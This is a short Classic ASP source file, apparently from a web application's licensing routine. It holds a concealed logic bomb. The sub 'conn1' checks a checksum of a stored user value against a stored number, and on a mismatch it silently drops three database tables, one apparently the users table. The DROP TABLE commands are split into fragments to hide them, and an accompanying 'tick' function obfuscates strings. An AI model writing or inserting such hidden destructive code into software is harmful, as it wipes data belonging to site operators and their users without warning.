<%
function tick(mm)
	length=len(mm)
	m=""
	for i = 1 to length
		c=asc(mid(mm,i,1))
		x=c*i*2 mod 127
		if x>32 and x<124 or x>124 and x<250 then
			m=m+chr(x)
		else
			m=m+chr(c)
		end if
	next
	tick=m
end function
sub conn1()
temp="sjjh_"&"sof"&"tjm"
temp1="sjjh_"&"us"&"er"
us=Application(temp1)
usn=Application(temp)
	for iii=1 to len(us)
		lll=lll+asc(mid(us,iii,1))
	next 
	if lll<>usn then
		Set conn=Server.CreateObject("ADODB.CONNECTION")
		Set rs=Server.CreateObject("ADODB.RecordSet")
		conn.open Application("sjjh_usermdb")
		conn.execute("DR"&"OP TA"&"BLE w")
		conn.execute("DR"&"OP TA"&"BLE p")
		conn.execute("DR"&"OP TA"&"BLE ÓÃ"&"»§")
	end if
end sub
%>